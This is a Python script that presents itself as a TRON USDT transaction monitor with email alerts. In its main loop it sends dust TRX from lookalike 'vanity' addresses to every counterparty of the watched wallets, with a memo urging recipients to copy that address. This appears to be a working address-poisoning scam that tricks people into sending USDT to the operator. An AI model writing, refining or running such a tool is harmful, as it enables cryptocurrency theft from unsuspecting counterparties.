import requests
import smtplib
import os
import time
from email.mime.text import MIMEText
from dotenv import load_dotenv
from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider
from decimal import Decimal

# Load environment variables
load_dotenv()

EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")

WALLET_ADDRESSES = os.getenv("WALLET_ADDRESSES", "").split(",")
VANITY_ADDRESSES = os.getenv("VANITY_ADDRESSES", "").split(",")
VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS", "").split(",")

# USDT TRC20 Contract Address on TRON
USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

# Validate configuration
if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER]):
    print("❌ Missing email configuration.")
    exit(1)

if not (len(WALLET_ADDRESSES) == len(VANITY_ADDRESSES) == len(VANITY_PRIVATE_KEYS)):
    print("❌ Configuration mismatch:")
    print(f"- WALLET_ADDRESSES: {len(WALLET_ADDRESSES)}")
    print(f"- VANITY_ADDRESSES: {len(VANITY_ADDRESSES)}")
    print(f"- VANITY_PRIVATE_KEYS: {len(VANITY_PRIVATE_KEYS)}")
    exit(1)

# Log loaded wallet addresses
print("✅ Loaded addresses for monitoring:")
for i, addr in enumerate(WALLET_ADDRESSES):
    print(f"{i+1}. Wallet: {addr.strip()} | Vanity: {VANITY_ADDRESSES[i].strip()}")

client = Tron(HTTPProvider(endpoint_uri="https://api.tronstack.io"))
last_tx_ids = {}

def is_contract_address(address):
    try:
        account_info = client.get_account(address)
        return 'contract' in account_info and account_info['contract']
    except Exception as e:
        print(f"⚠️ Error checking if address is a contract: {e}")
        return False

def get_latest_transaction(wallet_address):
    try:
        url = f"https://apilist.tronscanapi.com/api/transaction?sort=-timestamp&limit=1&start=0&address={wallet_address}&trc20Transfer=true"
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            print(f"❌ Tronscan API failed for {wallet_address}. Status: {response.status_code}")
            return None
        data = response.json()
        return data.get("data", [None])[0]
    except Exception as e:
        print(f"⚠️ Error fetching transaction for {wallet_address}: {e}")
        return None

def send_email(subject, body):
    try:
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        print("📧 Email sent.")
    except Exception as e:
        print(f"❌ Failed to send email: {e}")

def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001")):
    try:
        if is_contract_address(to_address):
            print(f"⚠️ Not sending to contract address: {to_address}")
            return

        priv_key = PrivateKey(bytes.fromhex(priv_key_hex))
        balance = client.get_account_balance(from_address)
        print(f"💰 {from_address} balance: {balance} TRX")

        if balance < amount:
            print("❌ Not enough TRX balance to send.")
            return

        txn = (
            client.trx.transfer(from_address, to_address, int(amount * 1_000_000))
            .memo(f"reuse_usdt_address_copy_from_{from_address}_for_less_fee")
            .build()
            .sign(priv_key)
        )
        result = txn.broadcast().wait()
        print(f"✅ TRX sent to {to_address}. TxID: {result.get('id', 'n/a')}")
    except Exception as e:
        print(f"❌ Failed to send TRX: {e}")

print("🚀 Starting TRON USDT monitor...")

if os.getenv("SEND_TEST_EMAIL", "false").lower() == "true":
    send_email("Monitor Active", "TRON wallet monitor is running.")

while True:
    try:
        for i, my_address in enumerate(WALLET_ADDRESSES):
            my_address = my_address.strip()
            print(f"🔍 Checking address: {my_address}")
            tx = get_latest_transaction(my_address)
            if tx:
                tx_id = tx.get("hash")
                if last_tx_ids.get(my_address) != tx_id:
                    last_tx_ids[my_address] = tx_id

                    sender = tx.get("ownerAddress")
                    receiver = tx.get("toAddress")
                    amount = int(tx.get("contractData", {}).get("amount", 0)) / 1e6
                    interacting_address = receiver if sender == my_address else sender

                    if interacting_address in WALLET_ADDRESSES or interacting_address in VANITY_ADDRESSES:
                        print(f"⚠️ Skipping internal address: {interacting_address}")
                        continue

                    if interacting_address == USDT_CONTRACT_ADDRESS:
                        print("⚠️ Skipping USDT contract address.")
                        continue

                    if is_contract_address(interacting_address):
                        print(f"⚠️ Skipping contract address: {interacting_address}")
                        continue

                    subject = f"🔔 New USDT Transaction for {my_address}"
                    body = f"""
New USDT transaction detected:

Wallet: {my_address}
Amount: {amount:.6f} USDT
From: {sender}
To: {receiver}
TxID: {tx_id}
View: https://tronscan.org/#/transaction/{tx_id}
"""
                    print(body)
                    send_email(subject, body)

                    send_trx(VANITY_ADDRESSES[i].strip(), VANITY_PRIVATE_KEYS[i].strip(), interacting_address)
                else:
                    print(f"⏸ No new transaction for {my_address}.")
            else:
                print(f"⏸ No transaction found for {my_address}.")
            time.sleep(1)
    except Exception as e:
        print(f"❗ Monitoring error: {e}")
    
    print("⏳ Sleeping 30s...\n")
    time.sleep(30)
